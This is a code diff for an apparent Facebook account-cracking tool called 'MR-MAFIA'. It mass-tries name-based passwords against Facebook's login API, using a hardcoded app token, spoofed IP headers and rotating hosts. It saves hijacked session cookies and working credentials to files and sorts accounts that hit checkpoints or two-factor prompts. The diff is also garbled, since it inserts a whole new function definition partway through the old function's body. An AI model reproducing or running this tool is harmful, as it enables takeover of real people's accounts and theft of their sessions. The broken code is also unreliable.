@@ -329,36 +329,118 @@ def Maf_2(ids, names, passlist):
                 ssbb = base64.b64encode(os.urandom(18)).decode()
                 cookie = f"sb={ssbb};{coki}"
                 print(f"\r\r{G}(MAFIA-OK) {masked_id} | {masked_pw}")
-                open("/sdcard/MR-MAFIA/MAFIA-M2-COOKIE.txt","a").write(cookie+"\n")
-                open("/sdcard/MR-MAFIA/MAFIA-M2-OK.txt","a").write(ids+" | "+pas+"\n")
+#-----> Method 2 <-----#
+def Maf_2(ids, names, passlist):
+    try:
+        global ok, loop, locale, country, pcp, oks, cps
+        mrmafia = random.choice([P, W, G, S, B, Y, R, O])
+        sys.stdout.write(f'\r\r {W}({mrmafia}MR-MAFIA{W}) ({loop})')
+        sys.stdout.flush()
+
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+
+        # ==== API HOST GANDA ====
+        api_host = random.choice([
+            "b-api.facebook.com",
+            "b-graph.facebook.com",
+            "graph.facebook.com",
+            "m.facebook.com"
+        ])
+
+        for pw in passlist:
+            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
+
+            data = {
+                "MAFIA": str(uuid.uuid4()),
+                "format": "json",
+                "MR_MAFIA": str(uuid.uuid4()),
+                "MAFIA_XD": "true",
+                "family_device_id": str(uuid.uuid4()),
+                "credentials_type": "device_based_login_password",
+                "error_detail_type": "button_with_disabled",
+                "source": "device_based_login",
+                "email": ids,
+                "password": pas,
+                "access_token": "350685531728|62f8ce9f74b12f84c123cc23c23c",
+                "generate_session_cookies": "1",
+                "locale": locale,
+                "client_country_code": country,
+                "method": "auth.login",
+                "fb_api_req_friendly_name": "authenticate",
+                "fb_api_caller_class": "com.facebook.account.login.protocol",
+                "api_key": "882a8490361da98702bf97a021ddc14d",
+                "cpl": "true",
+                "client_skip_cache": "true"
+            }
+
+            head = {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "X-FB-Net-HNI": "45204",
+                "X-FB-SIM-HNI": "45201",
+                "X-FB-Connection-Type": "CELLULAR",
+                "X-FB-HTTP-Engine": "Liger",
+                "Connection": "Keep-Alive",
+                "Host": api_host,
+                "User-Agent": mafia_Uax,
+                "Accept-Encoding": "gzip, deflate",
+                "Accept-Language": "id-ID,id;q=0.9",
+                "forwarded": f"for={random_ip}; by={random_ip}",
+                "x-forwarded-for": random_ip,
+                "x-real-ip": random_ip,
+                "client-ip": random_ip,
+            }
+
+            url = f'https://{api_host}/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+
+            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
+
+            po = requests.post(url, data=data, headers=head, allow_redirects=False, timeout=15)
+            time.sleep(random.uniform(1.2, 2.5)) # JEDA WAKTU PENTING
+
+            try:
+                q = json.loads(po.text)
+            except:
+                continue
+
+            masked_id = mask_user(ids)
+            masked_pw = mask_pass(pas)
+
+            if 'session_key' in q:
+                coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
+                ssbb = base64.b64encode(os.urandom(18)).decode().rstrip('=')
+                cookie = f"sb={ssbb};{coki}"
+                print(f'\r{G}(MAFIA-OK) {masked_id} | {masked_pw}{W}')
+                ok += 1
+                print(f'[✔] BISCUT-🍪: {mrmafia}' + cookie)
+                open('/sdcard/MR-MAFIA/MAFIA-M2-COOKIE.txt','a').write(ids + ' | ' + cookie + '\n')
+                open('/sdcard/MR-MAFIA/MAFIA-M2-OK.txt','a').write(ids + ' | ' + pas + '\n')
                 oks.append(ids)
                 break
 
             elif twf in str(po):
-                print(f"\r\r{B}(MAFIA-2F) {ids} | {pas} -> (0331)")
-                twfs.append(ids)
-                break
+                if 'y' in pcp:
+                    print(f'\r\r{B}(MAFIA-2F) {ids} | {pas}\033[1;97m')
+                    open('/sdcard/MR-MAFIA/MAFIA-M2F.txt','a').write(ids + ' | ' + pas + '\n')
+                    cps.append(ids)
+                    break
 
-            elif 'www.facebook.com' in str(po) or 'error_message' in str(po):
-                print(f"\r\r{O}(MAFIA-CP) {masked_id} | {masked_pw}")
-                open("/sdcard/MR-MAFIA/MAFIA-CP.txt","a").write(ids+" | "+pas+"\n")
-                cps.append(ids)
-                break
+            elif 'www.facebook.com' in str(po) or 'checkpoint' in str(po) or 'login_approval' in str(po):
+                if 'y' in pcp:
+                    print(f'\r\r{O}(MAFIA-CP) {masked_id} | {masked_pw}\033[0m')
+                    open('/sdcard/MR-MAFIA/MAFIA-M2-CP.txt','a').write(ids + ' | ' + pas + '\n')
+                    cps.append(ids)
+                    break
 
             else:
-                open("/sdcard/MR-MAFIA/MAFIA-CP.txt","a").write(ids+" | "+pas+"\n")
-                break
-
-            # ✅ JEDA WAKTI AMAN: 10 DETIK (JANGAN DIHAPUS)
-            time.sleep(10)
-
-        loop += 1
-
-    except requests.exceptions.ConnectionError:
-        time.sleep(10)
+                print(f'\r{R}(MAFIA-NO) {masked_id} | {masked_pw}{W}')
 
     except Exception as e:
         pass
+
 
 #-----> Method 3 <-----#        
 def Maf_3(ids, names, passlist):
